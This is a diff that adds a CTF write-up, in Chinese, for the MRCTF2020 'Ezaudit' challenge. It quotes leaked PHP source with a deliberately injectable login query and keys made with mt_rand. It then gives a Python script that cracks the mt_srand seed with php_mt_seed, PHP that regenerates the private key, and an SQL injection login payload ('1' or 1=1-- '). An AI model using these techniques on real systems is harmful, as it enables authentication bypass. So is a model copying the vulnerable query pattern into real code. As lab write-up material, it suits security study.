@@ -568,3 +568,112 @@ var_dump(base64_encode(serialize($a)));
 实际上过滤的敏感词要比泄漏的源码要多
 
 ![image-20210427114505576](image-20210427114505576.png)
+
+## [MRCTF2020]Ezaudit
+
+源码泄漏`www.zip`
+
+```php
+<?php 
+header('Content-type:text/html; charset=utf-8');
+error_reporting(0);
+if(isset($_POST['login'])){
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    $Private_key = $_POST['Private_key'];
+    if (($username == '') || ($password == '') ||($Private_key == '')) {
+        // 若为空,视为未填写,提示错误,并3秒后返回登录界面
+        header('refresh:2; url=login.html');
+        echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!";
+        exit;
+}
+    else if($Private_key != '*************' )
+    {
+        header('refresh:2; url=login.html');
+        echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!";
+        exit;
+    }
+
+    else{
+        if($Private_key === '************'){
+        $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';'; 
+        $link=mysql_connect("localhost","root","root");
+        mysql_select_db("test",$link);
+        $result = mysql_query($getuser);
+        while($row=mysql_fetch_assoc($result)){
+            echo "<tr><td>".$row["username"]."</td><td>".$row["flag"]."</td><td>";
+        }
+    }
+    }
+
+} 
+// genarate public_key 
+function public_key($length = 16) {
+    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $public_key = '';
+    for ( $i = 0; $i < $length; $i++ )
+    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
+    return $public_key;
+  }
+
+  //genarate private_key
+  function private_key($length = 12) {
+    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $private_key = '';
+    for ( $i = 0; $i < $length; $i++ )
+    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
+    return $private_key;
+  }
+  $Public_key = public_key();
+  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???
+```
+
+> mt_srand种子爆破
+
+```python
+import os
+
+s="KVQP0LdJKRaV3n9D"
+randstr="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"#pay attention
+
+seed=""
+
+for i in range(len(s)):
+    pos=randstr.index(s[i])
+    seed+="%s %s %s %s "%(pos,pos,0,len(randstr)-1)
+
+os.system("./php_mt_seed "+seed)
+```
+
+得到`1775196155`
+
+```php
+<?php
+function public_key($length = 16) {
+    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $public_key = '';
+    for ( $i = 0; $i < $length; $i++ )
+    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);
+    return $public_key;
+  }
+
+  //genarate private_key
+function private_key($length = 12) {
+    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    $private_key = '';
+    for ( $i = 0; $i < $length; $i++ )
+    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);
+    return $private_key;
+}
+mt_srand(1775196155);
+$Public_key = public_key();
+$p=private_key();
+var_dump($Public_key);
+var_dump($p);
+```
+
+私钥为`XuNhoueCDCGc`
+
+最后传入的参数为`username=crispr&password=1' or 1=1-- &Private_key=XuNhoueCDCGc&login=%E7%99%BB%E5%BD%95`
+
+或者类似sqli-labs的less-1的做法
